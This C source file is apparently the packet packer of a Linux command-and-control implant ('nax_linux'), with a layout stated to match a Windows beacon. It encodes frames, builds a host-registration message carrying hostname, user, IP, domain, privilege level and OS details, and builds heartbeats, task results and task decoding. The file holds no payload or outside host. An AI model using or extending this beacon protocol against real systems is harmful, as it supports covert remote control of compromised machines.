/* nax_linux/src/Core/packer.c
 * Wire-v0 frame encode/decode + REGISTER/HEARTBEAT/RESULT builders.
 * All integers are little-endian.
 */

#include "nax_linux.h"
#include <string.h>
#include <stdint.h>
#include <unistd.h>

/* ===== LE helpers ===== */

static inline void w16(uint8_t *p, uint16_t v) {
    p[0] = (uint8_t)(v & 0xFF);
    p[1] = (uint8_t)((v >> 8) & 0xFF);
}

static inline void w32(uint8_t *p, uint32_t v) {
    p[0] = (uint8_t)(v & 0xFF);
    p[1] = (uint8_t)((v >> 8) & 0xFF);
    p[2] = (uint8_t)((v >> 16) & 0xFF);
    p[3] = (uint8_t)((v >> 24) & 0xFF);
}

static inline uint16_t r16(const uint8_t *p) {
    return (uint16_t)p[0] | ((uint16_t)p[1] << 8);
}

static inline uint32_t r32(const uint8_t *p) {
    return (uint32_t)p[0] | ((uint32_t)p[1] << 8) |
           ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

/* ===== frame encode ===== */
/* [msg_type(1)][0x00(1)][body_len(4 LE)][body...] */

int nax_frame_encode(uint8_t msg_type,
                     const uint8_t *body, uint32_t body_len,
                     uint8_t *out, uint32_t *out_len)
{
    if (*out_len < NAX_FRAME_HDR + body_len)
        return -1;

    out[0] = msg_type;
    out[1] = 0x00;
    w32(out + 2, body_len);
    if (body_len > 0 && body)
        memcpy(out + NAX_FRAME_HDR, body, body_len);
    *out_len = NAX_FRAME_HDR + body_len;
    return 0;
}

/* ===== frame decode ===== */

int nax_frame_decode(const uint8_t *frame, uint32_t frame_len,
                     uint8_t *msg_type, uint8_t **body, uint32_t *body_len)
{
    if (frame_len < NAX_FRAME_HDR)
        return -1;
    uint32_t bl = r32(frame + 2);
    if (NAX_FRAME_HDR + bl > frame_len)
        return -1;
    if (msg_type)  *msg_type = frame[0];
    if (body)      *body     = (uint8_t *)frame + NAX_FRAME_HDR;
    if (body_len)  *body_len = bl;
    return 0;
}

/* ===== REGISTER body builder ===== */
/*
 * Layout (matches Windows beacon NaxBuildRegBody):
 *   u16 hn_len  + hn
 *   u16 un_len  + un
 *   u8  arch
 *   u32 pid
 *   u32 sleep_ms
 *   u32 tid
 *   u16 ip_len  + ip
 *   u16 dom_len + dom
 *   u16 proc_len + proc
 *   u8  elevated
 *   u32 os_major
 *   u32 os_minor
 *   u16 os_build
 *   u32 parent_pid
 *   u32 acp
 *   u32 oem_cp
 *   u16 img_len + img
 */
int nax_build_reg_body(const char *hn,   uint32_t hn_len,
                       const char *un,   uint32_t un_len,
                       uint8_t     arch,
                       uint32_t    pid,
                       uint32_t    sleep_ms,
                       uint32_t    tid,
                       const char *ip,   uint32_t ip_len,
                       const char *dom,  uint32_t dom_len,
                       const char *proc, uint32_t proc_len,
                       uint8_t     elevated,
                       uint32_t    os_major,
                       uint32_t    os_minor,
                       uint16_t    os_build,
                       uint32_t    parent_pid,
                       uint32_t    acp,
                       uint32_t    oem_cp,
                       const char *img,  uint32_t img_len,
                       uint8_t    *out,  uint32_t *out_len)
{
    uint32_t needed = 2 + hn_len + 2 + un_len + 1 + 4 + 4 + 4 +
                      2 + ip_len + 2 + dom_len + 2 + proc_len +
                      1 + 4 + 4 + 2 + 4 + 4 + 4 + 2 + img_len;
    if (*out_len < needed) return -1;

    uint8_t *p = out;
    w16(p, (uint16_t)hn_len);   p += 2; memcpy(p, hn, hn_len);   p += hn_len;
    w16(p, (uint16_t)un_len);   p += 2; memcpy(p, un, un_len);   p += un_len;
    *p++ = arch;
    w32(p, pid);                p += 4;
    w32(p, sleep_ms);           p += 4;
    w32(p, tid);                p += 4;
    w16(p, (uint16_t)ip_len);   p += 2; memcpy(p, ip, ip_len);   p += ip_len;
    w16(p, (uint16_t)dom_len);  p += 2; memcpy(p, dom, dom_len); p += dom_len;
    w16(p, (uint16_t)proc_len); p += 2;
    if (proc_len > 0) memcpy(p, proc, proc_len);
    p += proc_len;
    *p++ = elevated;
    w32(p, os_major);           p += 4;
    w32(p, os_minor);           p += 4;
    w16(p, os_build);           p += 2;
    w32(p, parent_pid);         p += 4;
    w32(p, acp);                p += 4;
    w32(p, oem_cp);             p += 4;
    w16(p, (uint16_t)img_len);  p += 2;
    if (img_len > 0) memcpy(p, img, img_len);
    p += img_len;

    *out_len = needed;
    return 0;
}

/* ===== HEARTBEAT ===== */

int nax_build_heartbeat(uint8_t *out, uint32_t *out_len)
{
    return nax_frame_encode(NAX_WIRE_HEARTBEAT, NULL, 0, out, out_len);
}

/* ===== RESULT ===== */
/*
 * RESULT frame body: task_id(4) + status(1) + data_len(4) + data
 */
int nax_build_result(uint32_t        task_id,
                     uint8_t         status,
                     const uint8_t  *data,  uint32_t data_len,
                     uint8_t        *out,   uint32_t *out_len)
{
    uint32_t body_len = 4 + 1 + 4 + data_len;
    uint32_t needed   = NAX_FRAME_HDR + body_len;
    if (*out_len < needed) return -1;

    out[0] = NAX_WIRE_RESULT;
    out[1] = 0;
    w32(out + 2, body_len);

    uint8_t *p = out + NAX_FRAME_HDR;
    w32(p, task_id); p += 4;
    *p++ = status;
    w32(p, data_len); p += 4;
    if (data_len > 0 && data)
        memcpy(p, data, data_len);

    *out_len = needed;
    return 0;
}

/* ===== TASK decode ===== */
/*
 * TASK body: task_id(4) + cmd_id(1) + args_len(4) + args
 */
int nax_decode_task(const uint8_t *body, uint32_t body_len, NaxTask *t)
{
    if (body_len < 9) return -1;
    t->task_id  = r32(body);
    t->cmd_id   = body[4];
    t->args_len = r32(body + 5);
    if (9u + t->args_len > body_len) return -1;
    t->args = (t->args_len > 0) ? (uint8_t *)body + 9 : NULL;
    return 0;
}

/* ===== helper: read len-prefixed string from args buffer ===== */

const char *nax_read_lenstr(const uint8_t *buf, uint32_t buf_len,
                             uint32_t *off, uint32_t *str_len)
{
    if (*off + 4 > buf_len) return NULL;
    uint32_t sl = r32(buf + *off); *off += 4;
    if (*off + sl > buf_len) return NULL;
    if (str_len) *str_len = sl;
    const char *s = (const char *)(buf + *off);
    *off += sl;
    return s;
}
